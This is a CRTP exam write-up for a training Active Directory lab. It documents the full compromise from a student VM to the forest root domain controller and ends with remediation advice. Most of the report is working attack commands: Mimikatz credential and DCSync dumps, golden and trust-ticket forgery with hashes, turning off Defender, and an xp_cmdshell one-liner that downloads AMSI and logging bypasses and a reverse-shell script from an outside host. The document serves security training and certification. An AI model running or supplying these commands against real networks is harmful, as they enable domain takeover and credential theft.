# **Altered Security**

## **Attacking & Defending Active Directory (CRTP) Examination Report**

![](https://i.imgur.com/4YmMQCH.png)

**Target: Altered Security Examination Lab ( DOMAIN )**

**Date: December 26, 2023**

**Owner: Olakojo Olaoluwa Joshua**

## **TABLE OF CONTENTS**

**00 - studvm.tech.finance.corp ............................................................................ 14** 

**01 - mgmtsrv.tech.finance.corp ............................................................................ 18** 

**02 - techsrv30.tech.finance.corp ............................................................................ 22** 

**03 - dbserver31.tech.finance.corp ............................................................................ 28** 

**04 - tech-dc.tech.finance.corp ............................................................................ 32** 

**05 - finance-dc.finance.corp ............................................................................ 34** 

**06 - Remediation and Recommendation ............................................................................ 36**

<div style="page-break-after: always"></div>


# **00 - studvm.tech.finance.corp**

***
## ***System Information***
***

Hostname: **studvm**

IP Address: **172.16.100.1**

***
## ***Domain Enumeration***
***


**Studvm** is a domain computer and we are authenticated with domain credentials. We can enumerate the domain using `Powerview`

- To enumumerate all **users** with their "**samaccountname**" and "**logonCount**" properties.

```powershell
Get-DomainUser -Properties samaccountname,logonCount
```

![](https://i.imgur.com/QSnJcIP.png)

- To enumerate all domain computers and display only their names

```
Get-DomainComputer | select Name
```

![](https://i.imgur.com/WiId0KU.png)

> We can also enumerate DNS hostnames of the domain computers

![](https://i.imgur.com/p49H13H.png)

- To enumerate all domain admins group

```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

![](https://i.imgur.com/bwhP2Xr.png)

- To enumerate members of the Enterprise Admins group

```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

![](https://i.imgur.com/W7lRxsY.png)

> **Note :** We need to query the root domain as Enterprise Admins group is present only in the root of a forest, the `-Domain` parameter does this for us


- To enumerate shares

```
Invoke-ShareFinder -Verbose
```

![](https://i.imgur.com/hdsank5.png)


> **Check if shares are accessible -:**

```
dir "\\dnshostname\sharename"
```

![](https://i.imgur.com/1YulKWc.png)

- To enumerate Organizational Units (OUs)

```
Get-DomainOU
```

![](https://i.imgur.com/3TJ0u4q.png)

- To enumerate all Group Policies (GPOs)

```
Get-DomainGPO
```

![](https://i.imgur.com/D1UpxTl.png)

- Now to Enumerate GPOs applied on the 'Domain Controllers' OU

```
# Get OU name first
Get-DomainOU -Properties Name

# Grab identity on specific OU name
Get-DomainOU -Identity 'Domain Controllers'

# Get GPO applied
Get-DomainGPO -Identity '{6AC1786C-016F-11D2-945F-00C04fB984F9}'
```

![](https://i.imgur.com/0AjecE6.png)


![](https://i.imgur.com/1xVyGhJ.png)

- ACL for the Users group

```
Get-DomainObjectAcl -Identity "Users" -ResolveGUIDs -Verbose
```

![](https://i.imgur.com/ZlNRw1j.png)

- ACL for the Domain Admins group

```
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```

![](https://i.imgur.com/jlLOr2r.png)

- All modify rights/permissions for the current user

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studvm"}
```

![](https://i.imgur.com/knh9Gdr.png)


***
## **Steps to Compromise**
***

> **Privilege Escalation** refers to the process of gaining higher levels of access or permissions on a computer system than originally intended by its administrator, Since we don't have administrative permissions/rights on `studvm.tech.finance.corp`, we can go ahead and escalate privileges to local administrator

- After proper enumeration the `C:\Users\studentuser\Desktop\shared\Download\` is an excluded path for windows defender, we can go ahead and upload our `PowerUp.ps1` script there

![](https://i.imgur.com/VG7OOjg.png)

- Load powerview into the current PowerShell session

```
C:\Users\studentuser\Desktop\shared\Download\InviShell\RunWithRegistryNonAdmin.bat

cd C:\Users\studentuser\Desktop\shared\Download

# loads the PowerUp.ps1 PowerShell script in current section through dot-sourcing
. 'C:\Users\studentuser\Desktop\shared\Download\PowerUp\PowerUp.ps1'
```

We can then use the `Powerup` from PowerSploit module to check for any privilege escalation path

```
Invoke-AllChecks
```

![](https://i.imgur.com/0T41gwy.png)

- Let’s use the abuse function for `Invoke-ServiceAbuse` and add our current domain user to the local Administrators group, whereby abusing the **vds** service.

> The 'vds' service refers to the "Virtual Disk" service in Windows. The Virtual Disk service is responsible for managing and providing access to virtual disks on a system. This service is associated with disk management features, including disk partitioning and volume management.

```
Invoke-ServiceAbuse -Name 'vds' -UserName 'tech\studentuser' -Verbose
```

![](https://i.imgur.com/SrSjaXM.png)

> We can see that the `tech\studentuser` is a local administrator now. Just logoff and logon again and we have local administrator privileges!

- We can also go ahead and turn off **real Time Protection** to avoid windows defender from flagging most of our tools as viruses

![](https://i.imgur.com/TKqxllj.png)

***
## **Enumeration Cont'd**
***

> Due to the fact that i found out that some some commands where not working due to windows defender, i postponed some enumeration process and i will share them here

- Get all domains in the current forest

```
Get-ForestDomain -verbose 
```

***Before Privilege Escalation***

![](https://i.imgur.com/rxEYvRn.png)

***After Privilege Escalation***

![](https://i.imgur.com/ZpW5vje.png)

- Get details about the current forest

```
Get-Forest
```

***Before Privilege Escalation***

![](https://i.imgur.com/09BBh63.png)

***After Privilege Escalation***

![](https://i.imgur.com/TSTHcQH.png)

- Map the trusts of All Domain

```
Get-ForestDomain -verbose | select Name

Get-DomainTrust -Domain tech.finanace.corp

Get-DomainTrust -Domain finance.corp
```

![](https://i.imgur.com/QTcoGh9.png)

- Local Admin Rights - **Bloodhound**

![](https://i.imgur.com/SF9ixHT.png)

> The user `STUDENTUSER@TECH.FINANCE.CORP` has admin rights to the computer `STUDVM.TECH.FINANCE.CORP`.

- Constrained Delegation Privileges - **Bloodhound**

![](https://i.imgur.com/cNcpWCm.png)

> The computer `STUDVM.TECH.FINANCE.CORP` has the constrained delegation privilege to the computer `MGMTSRV.TECH.FINANCE.CORP`.

# **01 - mgmtsrv.tech.finance.corp**

***
## ***System Information***
***

Hostname: **mgmtsrv**

IP Address: **172.16.5.156**

***
## **Steps to Compromise**
***


- Enumerating the domain i found a kerberoastable user called `sqlserversync` and has SPN set


```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PowerView.ps1

Get-DomainUser -SPN
```

![](https://i.imgur.com/gQ5GG5j.png)

- After sevreral trials i was able to dump the hashes but couldn't crack it

```
C:\AD\Tools\Rubeus.exe kerberoast /user:sqlserversync /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

![](https://i.imgur.com/vd2eraG.png)

```
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe -- wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

![](https://i.imgur.com/1QtUSeK.png)


> **Although remember we had constrained delegation on `MGMTSRV.TECH.FINANCE.CORP` in our enumeration phase with bloodhound, Constrained delegation is a feature in Microsoft Active Directory that allows a service on one computer to impersonate a user and access resources on another computer. This means that the `STUDVM` computer is allowed to delegate authentication requests to `MGMTSRV` for specific services without exposing the user's credentials.**

- To enumerate users with constrained delegation we can use PowerView

```
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -TrustedToAuth
```

![](https://i.imgur.com/4aVRLRt.png)

- Since we don't have the `aes256` hash for `studvm$` which is a requirement we need to extract credentials from the domain using a modified `Invoke-MimiEx.ps1`, you can get it from [here](https://github.com/sec-fortress/CRTP-Notes/blob/main/Invoke-MimiEx.ps1)

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
.\Invoke-MimiEx.ps1
```

- Optionnally you can use the normal `Invoke-Mimi.ps1`


```
. .\Invoke-Mimi.ps1
Invoke-Mimi -Command '"sekurlsa::ekeys"'
```

![](https://i.imgur.com/Kv3N9nl.png)

- We can then impersonate the "Administrator" user for the CIFS service on the "mgmtsrv.tech.finance.corp" server using a forged TGT

```
C:\AD\Tools\Rubeus.exe s4u /user:studvm$ /aes256:fd069296acc71ffef3a811fdd4264092f5819fc361d4625201d4771867d5f37d /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.tech.finance.corp /ptt
```

- We should now be able to view file share on `mgmtsrv`


```
dir \\mgmtsrv.tech.finance.corp\c$
```

![](https://i.imgur.com/k0ejVRI.png)

- Although this is not enough for us, we need to gain an interactive shell to move further, we can then craft a Kerberos ticket to impersonate the "Administrator" user for the CIFS service on "mgmtsrv.tech.finance.corp" while using the "host" service.

```
C:\AD\Tools\Rubeus.exe s4u /user:studvm$ /aes256:fd069296acc71ffef3a811fdd4264092f5819fc361d4625201d4771867d5f37d /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.tech.finance.corp /altservice:host /ptt
```

- We can then use PsExec.exe to gain an interactive powershell session on `mgmtsrv`

```
PsExec.exe \\mgmtsrv.tech.finance.corp powershell
```

![](https://i.imgur.com/1T1FUHW.png)

# **02 - techsrv30.tech.finance.corp**

***
## ***System Information***
***

Hostname: **techsrv30**

IP Address: **172.16.6.30**

***
## **Steps to Compromise**
***

- Since we now have access to `mgmtsrv.tech.finance.corp` as **administrator**, we can go ahead and extract encryption keys stored in LSASS memory with the tool `Invoke-Mimi.ps1`

```
. .\ invoke-mimi.ps1
Invoke-Mimi -Command '"sekurlsa::ekeys"'
```

![](https://i.imgur.com/VWFdecs.png)

- We were able to find `Techservice` `aes256_hmac` hash, we can use `SafetyKatz` to OverPass-the-Hash for the user `techservice`, open up a new command prompt process with administrative access loaded with invisi-shell 

> Overpass-the-Hash" refers to a variation of the "Pass-the-Hash" attack technique, where attackers not only capture hashed passwords from a compromised system but also manipulate or forge these hash values for malicious purposes

```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:techservice /domain:TECH.FINANCE.CORP /aes256:7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb /run:cmd.exe" "exit"
```

![](https://i.imgur.com/7rkq2Z4.png)

- The new process that starts has `techservice` privileges. Check if `techservice` has admin privileges on any other machine using `Find-PSRemotingLocalAdminAccess.ps1`

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 

. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1 

Find-PSRemotingLocalAdminAccess
```

![](https://i.imgur.com/M75UjvW.png)

- We have local admin access on the `techsrv30` server as `techservice`, we can go ahead and spawn an interactive shell on `techsrv30` using `winrs`

```
winrs -r:techsrv30 cmd
```

![](https://i.imgur.com/WjrWuTa.png)

- We can then confirm if `techservice` is an **"administrator"** on `techsrv30

```
Net LocalGroup Administrators
```

![](https://i.imgur.com/XpXW1vz.png)

> Yeah, we now belong to the local administrators group as `techservice`

# **03 - dbserver31.tech.finance.corp**

***
## ***System Information***
***

Hostname: **dbserver31**

IP Address: **172.16.6.31**

***
## **Steps to Compromise**
***

- Since we have administrative privileges on `techsrv30`, we can go ahead and extract credentials from credential vault using `Invoke-Mimikatz.ps1`, First of all transfer the file to our machine using `curl`

```
curl http://172.16.100.1/Invoke-Mimikatz.ps1 -O .\Invoke-Mimikatz.ps1
```

![](https://i.imgur.com/9a0wCn7.png)

- Now execute invoke-mimikatz to extract credentials

```
# Start up powershell
powershell

# load invoke-mimkatz.ps1 into current powershell process
. .\Invoke-Mimikatz.ps1

# extract credentials from credential vault
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```

> The following command uses `Mimikatz` to perform token manipulation and access the Windows Credential Manager (vault::cred) to potentially interact with stored credentials

![](https://i.imgur.com/u8GTRb6.png)

> We now have the **username:** `databaseagent` and **password:** `CheckforSQLServer31-Availability`

- We can go ahead and open up open up powershell as another user

![](https://i.imgur.com/aEo3v8E.png)

- Then fill in the **username** and **password** we found earlier from the credential vault

![](https://i.imgur.com/H8fZ09d.png)

- Since the `databaseagent` is just a user, just normal user like `studentuser` is but the thing is `databaseagent` user have got rights to access sqlserver and we have also got universal access to it, we are still on the `studvm` domain

![](https://i.imgur.com/6hikmc4.png)

- Enumerating the domain we can see that there is a MSSQL instance running on `DBSERVER31` and a service account called  `sqlserversync`, which we successfully kerberoasted the user, but failed to crack hash. Running `PowerUpSQL.ps1` we can enumerating SQL servers in the domain

```
cd \AD\Tools
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```

![](https://i.imgur.com/lDjVhbQ.png)

> As we can see we can access **MSSQL** instances on `dbserver31` since we have a **Connection Success** message, we also have **IsSysadmin** set to **Yes**, which means we can get command execution

- We can therefore enumerate more by crawling and listing database links in the domain

```
Get-SQLServerLinkCrawl -Instance dbserver31.tech.finance.corp -Verbose
```

![](https://i.imgur.com/3c8rFxa.png)

- We also have `is_rpc_out_enabled` set to **True** which means we can run `xp_cmdshell` on `dbserver31`

```
Get-SQLServerLink -Instance dbserver31.tech.finance.corp
```

![](https://i.imgur.com/i7mfsnK.png)

- Now let execute commands, in this case i will be running the `whoami` command

```
Get-SQLServerLinkCrawl -Instance DBSERVER31 -Query "exec master..xp_cmdshell 'whoami'"
```

![](https://i.imgur.com/XAowTvK.png)

- We can then attempt to spawn a reverse shell on `DBSERVER31`, Make sure you have `netcat` running first

```
C:\AD\Tools\nc64.exe -lvnp 443
```

![](https://i.imgur.com/IDz4yMR.png)

- Make sure to start **HFS** or any hosting services and upload the file `sbloggingbypass.txt`, `amsibypass.txt` and `Invoke-PowerShellTcpEx.ps1` in other to host them, then run the command below

```
Get-SQLServerLinkCrawl -Instance DBSERVER31 -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"'''
```

> This type of command is indicative of an attempt to execute code on a SQL Server instance through the use of extended stored procedures, i should now have a reverse shell as `dbserver31`

![](https://i.imgur.com/uOpH7nj.png)

# **04 - tech-dc.tech.finance.corp**

***
## ***System Information***
***

Hostname: **TECH-DC**

IP Address: **172.16.4.1**

***
## **Steps to Compromise**
***

- After proper enumeration with `bloodhound` i found out The user `SQLSERVERSYNC@TECH.FINANCE.CORP` has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege on the domain `TECH.FINANCE.CORP`.These two privileges allow a principal to perform a **DCSync** attack.

![](https://i.imgur.com/OamO2IX.png)

> A DCsync attack is a technique used by attackers to simulate the behavior of a Domain Controller (DC) and request domain account password data from other domain controllers in the network. This attack takes advantage of the way Active Directory replicates information between domain controllers. 

- Transfer `Invoke-Mimikatz.ps1` to `dbserver31` to perform a DCsync attack to retrieve the NTLM hash of the KRBTGT account

```
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:tech\krbtgt"'
```

![](https://i.imgur.com/Ch2hSca.png)
![](https://i.imgur.com/zxkbxun.png)

- Finally, we can use BetterSafetyKatz.exe to create a Golden ticket. Run the below command from an elevated command prompt

```
BetterSafetyKatz.exe "kerberos::golden /user:administrator /domain:tech.finance.corp /sid:S-1-5-21-1325336202-3661212667-302732393 /aes256:40e387636ed8c32ff3c1e3180a966860edd27d356c628824afa0e6bb006f9eb7 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

![](https://i.imgur.com/VMslTJH.png)

- Now check if ticket is injected successfully

```
klist
```

![](https://i.imgur.com/y2JaDiN.png)

- we should be able to access tech-dc with `winrs` now

```
winrs -r:tech-dc cmd
```

![](https://i.imgur.com/Ezh3LPP.png)

- Also go ahead and Disable Real Tme monitoring on TECH-DC

```
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```

![](https://i.imgur.com/rdTLYQa.png)

# **05 - finance-dc.finance.corp**

***
## ***System Information***
***

Hostname: **FINANCE-DC**

IP Address: **172.16.-.-**

***
## **Steps to Compromise**
***

- To abuse the Parent Domain as Child to Parent using Trust Tickets. I used SID-History Injection attack and Forging the Trust Ticket to gain command execution on `finance-dc.finance.corp`

> SID-History Injection is a technique that attackers can use to impersonate users or gain unauthorized access in a Windows Active Directory environment. The attack involves manipulating the Security Identifier (SID) of a user account by injecting additional SIDs into the SID-History attribute. This attribute is designed to store historical SIDs of a user account in scenarios such as migration between domains

- Running the below command from the process running as DA(`TECH-DC`) to copy Loader.exe on `TECH-DC` and use it to extract credentials

```powershell
# copy loader.exe to dcorp-dc
echo F | xcopy C:\AD\Tools\Loader.exe \\tech-dc\C$\Users\Public\Loader.exe /Y

# spawn interactive shell on dcorp-dc
winrs -r:tech-dc cmd

# set up port forwarding
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1

# Load loader.exe on memory of dcorp-dc
# Make sure to host SafetyKatz.exe on HFS first
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe

# Extract credentials on the new mimikatz session
lsadump::trust /patch
```

![](https://i.imgur.com/Y3cThSS.png)

- I now have the `rce4` of **[ IN ] TECH.FINANCE.CORP → FINANCE.CORP** 

![](https://i.imgur.com/BCmRzVn.png)

- Then using `BetterSafetyKatz.exe` to Forge a ticket with SID History of Enterprise Admins. thereby Running the below command from an elevated command prompt

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:TECH.FINANCE.CORP /sid:S-1-5-21-1325336202-3661212667-302732393 /sids:S-1-5-21-1712611810-3596029332-2671080496-500 /rc4:de44059e66ddeb88922a75d0f92b4255 /service:krbtgt /target:finance.corp /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
```

![](https://i.imgur.com/71Lqu0f.png)

> Remember we enumerated **members of the Enterprise Admins group**, the **MemberSID** is what we used for the `/sids:` option here

- Using Rubeus.exe to request TGS using saved ticket and requesting for CIFS(file server) from `finance-dc.finance.corp`

```
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/finance-dc.finance.corp /dc:finance-dc.finance.corp /ptt
```

![](https://i.imgur.com/yPFEIe6.png)

- I can now list all shares on the `C$` drive of `finance-dc.finance.corp`

```
dir \\finance-dc.finance.corp\c$
```

![](https://i.imgur.com/EDpfK4l.png)

# **Remediation and Recommendation**

### **Privilege Escalation**

- Adhere to the principle of least privilege. Ensure that users have the minimum permissions necessary to perform their job functions. Avoid granting unnecessary administrative privileges

- Use application control or application whitelisting solutions to restrict the execution of unauthorized scripts and binaries, including tools like `Invoke-ServiceAbuse`
- Review the configuration of the 'vds' service and modify it to restrict unauthorized access

***Articles***

- https://attack.mitre.org/tactics/TA0004/

### **Constrained delegation**

- Whenever possible, use Resource-Based Constrained Delegation (RBCD) instead of the traditional constrained delegation.

- Rather than delegating to all services on a computer, delegate to specific service accounts. This limits the exposure in case of compromise.

- Rotate passwords for service accounts used for constrained delegation regularly. Ensure that strong, unique passwords are used.

- If possible, segment the network to limit the impact of compromised accounts or systems.

***Articles***

- https://learn.microsoft.com/en-us/entra/identity/domain-services/deploy-kcd

- https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-unconstrained-kerberos

### **Credential Guard**

- Effective in stopping PTH and Over-PTH attacks by restricting access to
NTLM hashes and TGTs. It is not possible to write Kerberos tickets to
memory even if we have credentials.

- Mimikatz can bypass it but still, no need to not use it.

***Articles***

- https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/

- https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works

- https://blog.netwrix.com/2023/02/06/using-windows-defender-credential-guard-to-protect-privileged-credentials/

### **Trust Tickets**

- SID Filtering

- Avoid attacks which abuse SID history attribute (child to root domain
privilege escalation, that is, DA from a Child to EA on forest root).

- In an inter-forest trust, if Selective Authentication is configured, users
between the trusts will not be automatically authenticated. Individual
access to domains and servers in the trusting domain/forest should be
given.

***Articles***

- https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust
